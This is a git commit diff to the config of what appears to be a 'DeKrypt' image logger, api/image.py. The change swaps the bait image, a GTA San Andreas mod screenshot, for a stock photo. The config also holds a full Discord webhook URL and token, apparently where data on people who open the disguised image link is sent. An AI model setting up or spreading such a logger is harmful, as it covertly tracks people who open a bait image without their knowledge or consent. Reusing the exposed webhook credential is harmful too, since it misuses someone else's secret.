f36310d00743476026dcb3876ea0dd02a0457cfe
Suneo <keziahschizz@gmail.com>
2025-03-20 14:10:17 +0800

    Update image.py

--- api/image.py
+++ api/image.py
@@ -13,7 +13,7 @@ __author__ = "DeKrypt"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1352156778259025980/Ju9Yx18do6-jOBBEysRUDdUj9PgA8urlZVdYm7i9EhdJGzsjFMEAxVXnoEFVP2J59xzJ",
-    "image": "https://images.sftcdn.net/images/t_app-cover-l,f_auto/p/9708d23b-850d-425a-8e45-20248227fa3b/466666295/sa-mp-multiplayer-mod-for-gta-san-andreas-screenshot.png", # You can also have a custom image by using a URL argument
+    "image": "https://as1.ftcdn.net/v2/jpg/01/40/84/22/1000_F_140842203_dxeLjRwQsafgsdZwOs3gQ3mVV4nZAyLe.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
